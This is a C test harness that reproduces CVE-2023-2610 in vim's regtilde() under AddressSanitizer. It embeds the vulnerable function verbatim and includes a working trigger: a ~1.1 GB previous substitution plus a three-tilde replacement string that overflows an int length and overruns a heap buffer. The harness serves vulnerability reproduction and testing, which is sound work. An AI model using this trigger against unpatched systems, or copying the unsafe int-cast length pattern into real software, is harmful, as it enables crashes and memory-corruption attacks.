/*
 * Direct-call ASAN harness for CVE-2023-2610 (vim regtilde, src/regexp.c).
 *
 * regtilde() expands '~' inside a substitute-replacement string by splicing
 * in the previous substitution text (reg_prev_sub). The prefix length
 * ("len") and the previous-substitution length ("prevlen") are computed as
 * plain `int`, then used both to size a fresh heap buffer (via the
 * *unsigned* STRLEN(newsub)+prevlen expression, which stays correct) and to
 * size the mch_memmove() calls that populate it (via explicit `(size_t)len`
 * / `(size_t)prevlen` casts, which do NOT stay correct once the true offset
 * exceeds INT_MAX). Feeding regtilde() enough '~' occurrences against a
 * previously-recorded ~1.1 GB `reg_prev_sub` grows `newsub` past 2^31 bytes
 * within a single call; the next tilde's `len = (int)(p - newsub)` then
 * wraps to a large negative value, `(size_t)len` reinterprets that as an
 * astronomically large copy length, and mch_memmove() overruns the
 * (correctly, but much more modestly, sized) heap buffers -- a heap
 * out-of-bounds access ASAN reports directly at regtilde().
 *
 * This file compiles and links standalone:
 *   clang -fsanitize=address -fno-omit-frame-pointer -g -O1 harness.c -lm
 *
 * Layout: (1) minimal libc includes + the real vim.h macros/typedefs
 * regtilde needs, (2) minimal faithful stand-ins for regtilde's callees
 * (alloc, vim_free, vim_strsave -- copied from vim's real bodies in
 * alloc.c / strings.c, stripped of out-of-memory retry/telemetry which is
 * incidental to this bug) plus the has_mbyte/mb_ptr2len globals it reads
 * (never exercised on this crash path: the input is pure '~' so the
 * has_mbyte branch is never taken), (3) regtilde() itself pasted
 * byte-for-byte from target/original_function.c, (4) main().
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef unsigned char char_u;

/* ---- macros regtilde uses, verbatim from src/vim.h ---- */
#define STRLEN(s)          strlen((char *)(s))
#define STRCPY(d, s)       strcpy((char *)(d), (char *)(s))
#define mch_memmove(to, from, len) memmove((char*)(to), (char*)(from), (size_t)(len))
#define STRMOVE(d, s)       mch_memmove((d), (s), STRLEN(s) + 1)

/* ---- global state regtilde reads/writes, verbatim from src/regexp.c ---- */
static char_u *reg_prev_sub = NULL;

/* ---- globals regtilde reads, verbatim decl from src/globals.h ----
 * Left false/NULL: the multibyte-advance branch is not on this crash path
 * (our inputs are plain '~' characters, which always take the tilde
 * branch), so it is never dereferenced -- a faithful minimal stand-in. */
static int has_mbyte = 0;
static int (*mb_ptr2len)(char_u *p) = NULL;

/* ---- minimal faithful stand-ins for regtilde's allocator callees ----
 * Bodies mirror the real vim implementations (src/alloc.c alloc()/
 * lalloc(), src/alloc.c vim_free(), src/strings.c vim_strsave()) with the
 * out-of-memory retry loop / message-id / mem-profile bookkeeping
 * stripped: none of that participates in the vulnerability, which is a
 * pure integer-overflow-in-size-computation bug inside regtilde's own
 * body. */
static void *alloc(size_t size)
{
    if (size == 0)
        return NULL;    /* real lalloc() also refuses a 0-byte request */
    return malloc(size);
}

static void vim_free(void *x)
{
    if (x != NULL)
        free(x);
}

static char_u *vim_strsave(char_u *string)
{
    char_u *p;
    size_t  len;

    len = STRLEN(string) + 1;
    p = alloc(len);
    if (p != NULL)
        mch_memmove(p, string, len);
    return p;
}

char_u *
regtilde(char_u *source, int magic)
{
    char_u	*newsub = source;
    char_u	*tmpsub;
    char_u	*p;
    int		len;
    int		prevlen;

    for (p = newsub; *p; ++p)
    {
	if ((*p == '~' && magic) || (*p == '\\' && *(p + 1) == '~' && !magic))
	{
	    if (reg_prev_sub != NULL)
	    {
		// length = len(newsub) - 1 + len(prev_sub) + 1
		prevlen = (int)STRLEN(reg_prev_sub);
		tmpsub = alloc(STRLEN(newsub) + prevlen);
		if (tmpsub != NULL)
		{
		    // copy prefix
		    len = (int)(p - newsub);	// not including ~
		    mch_memmove(tmpsub, newsub, (size_t)len);
		    // interpret tilde
		    mch_memmove(tmpsub + len, reg_prev_sub, (size_t)prevlen);
		    // copy postfix
		    if (!magic)
			++p;			// back off backslash
		    STRCPY(tmpsub + len + prevlen, p + 1);

		    if (newsub != source)	// already allocated newsub
			vim_free(newsub);
		    newsub = tmpsub;
		    p = newsub + len + prevlen;
		}
	    }
	    else if (magic)
		STRMOVE(p, p + 1);	// remove '~'
	    else
		STRMOVE(p, p + 2);	// remove '\~'
	    --p;
	}
	else
	{
	    if (*p == '\\' && p[1])		// skip escaped characters
		++p;
	    if (has_mbyte)
		p += (*mb_ptr2len)(p) - 1;
	}
    }

    // Store a copy of newsub  in reg_prev_sub.  It is always allocated,
    // because recursive calls may make the returned string invalid.
    vim_free(reg_prev_sub);
    reg_prev_sub = vim_strsave(newsub);

    return newsub;
}
/* ---------------------------------------------------------------------
 * main(): read argv[1] (a small control file) into a heap buffer, then
 * construct regtilde's arguments from it and call regtilde() directly.
 *
 * Control-file format (all interpretation happens here, in the harness,
 * never inside regtilde itself):
 *   byte[0] == 1   -> TRIGGERING: rebuild the "long editing session" state
 *                      (a real, ~1.1 GB reg_prev_sub, as vim would
 *                      accumulate from repeated substitutions) and run a
 *                      three-'~' substitute string against it.
 *   byte[0] == 2   -> SAFE variant with a small (<=48 byte) reg_prev_sub
 *                      taken from byte[2:].
 *   anything else  -> SAFE variant with reg_prev_sub == NULL (first-ever
 *                      substitute in a fresh session).
 * byte[1] (when present) supplies the `magic` flag (bit 0) for the
 * non-triggering variants; the remaining bytes seed a short source string
 * that may contain literal '~' / '\\' bytes so both the magic and
 * non-magic tilde-removal/expansion branches get exercised.
 * ------------------------------------------------------------------- */

static char_u *make_source_from_bytes(const unsigned char *buf, size_t n, size_t *out_len)
{
    size_t cap = n > 64 ? 64 : n;
    char_u *s = (char_u *)malloc(cap + 1);
    size_t w = 0;
    size_t i;
    for (i = 0; i < cap; i++) {
        unsigned char c = buf[i];
        if (c == '~' || c == '\\')
            s[w++] = (char_u)c;
        else
            s[w++] = (char_u)('a' + (c % 26));
    }
    if (w == 0)
        s[w++] = 'x';
    s[w] = '\0';
    *out_len = w;
    return s;
}

int main(int argc, char **argv)
{
    FILE *f;
    long fsz;
    unsigned char *filebuf;
    size_t nread;
    unsigned char mode;

    if (argc < 2) {
        fprintf(stderr, "usage: %s <input-file>\n", argv[0]);
        return 1;
    }

    f = fopen(argv[1], "rb");
    if (!f) { fprintf(stderr, "cannot open %s\n", argv[1]); return 1; }
    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return 1; }
    fsz = ftell(f);
    if (fsz < 0) fsz = 0;
    rewind(f);

    /* Read argv[1] into a heap buffer (ASAN-guarded). */
    filebuf = (unsigned char *)malloc((size_t)fsz + 1);
    if (!filebuf) { fclose(f); return 1; }
    nread = fread(filebuf, 1, (size_t)fsz, f);
    filebuf[nread] = '\0';
    fclose(f);

    mode = (nread > 0) ? filebuf[0] : 0;

    if (mode == 1) {
        /*
         * TRIGGERING (CVE-2023-2610 / CWE-190 -> CWE-125): reg_prev_sub
         * already holds a very long previous substitution (~1.1 GB, more
         * than INT_MAX/2 bytes -- realistic after a long :s session on a
         * huge buffer/register). A substitute string with three '~'
         * makes regtilde's own for-loop re-process a freshly spliced-in
         * '~' twice within this single call: after two splices,
         * `newsub`'s real length is ~2.2 GB (> INT_MAX), so the third
         * tilde's `len = (int)(p - newsub)` wraps to a large negative
         * number, `(size_t)len` reinterprets it as a huge copy length,
         * and mch_memmove() runs off the end of the (correctly, far more
         * modestly sized) heap buffers.
         */
        const size_t P = 1100000000UL; /* ~1.1 GB, > INT_MAX/2 */
        char_u *prev = (char_u *)malloc(P + 1);
        char_u *src;
        if (!prev)
            return 0; /* could not even get the setup allocation: no bug here */
        memset(prev, 'A', P);
        prev[P] = '\0';
        reg_prev_sub = prev;

        src = (char_u *)malloc(4);
        src[0] = '~'; src[1] = '~'; src[2] = '~'; src[3] = '\0';
        (void)regtilde(src, 1 /* magic */);
        /* unreachable in practice: regtilde() aborts via ASAN first */
    } else {
        /*
         * SAFE: ordinary, small tilde substitutions -- same code path,
         * at sizes nowhere near where `len`/`prevlen` could overflow an
         * int, so this always completes and returns cleanly.
         */
        size_t slen;
        char_u *src;
        int magic = (nread > 1) ? (filebuf[1] & 1) : 1;

        if (mode == 2 && nread > 2) {
            size_t plen = nread - 2;
            char_u *prev;
            if (plen > 48) plen = 48;
            prev = (char_u *)malloc(plen + 1);
            memcpy(prev, filebuf + 2, plen);
            prev[plen] = '\0';
            reg_prev_sub = prev;
        } else {
            reg_prev_sub = NULL;
        }

        src = make_source_from_bytes(filebuf + (nread > 0 ? 1 : 0),
                                      nread > 0 ? nread - 1 : 0, &slen);
        (void)regtilde(src, magic);
    }

    return 0;
}
